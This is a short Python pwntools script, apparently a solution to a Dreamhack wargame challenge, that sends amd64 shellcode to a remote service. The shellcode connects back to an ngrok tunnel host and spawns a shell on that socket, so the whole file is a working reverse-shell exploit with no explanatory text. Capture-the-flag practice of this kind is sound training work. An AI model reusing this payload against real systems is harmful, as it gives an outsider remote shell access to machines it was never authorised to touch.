from pwn import *

context.arch = "amd64"

port = 14418
rem = remote("host1.dreamhack.games", port)

my_port = 16249
shellcode = shellcraft.connect("0.tcp.jp.ngrok.io", my_port)
shellcode += shellcraft.findpeersh(my_port)
payload = asm(shellcode)
rem.sendafter(b"shellcode: ", payload)

rem.interactive()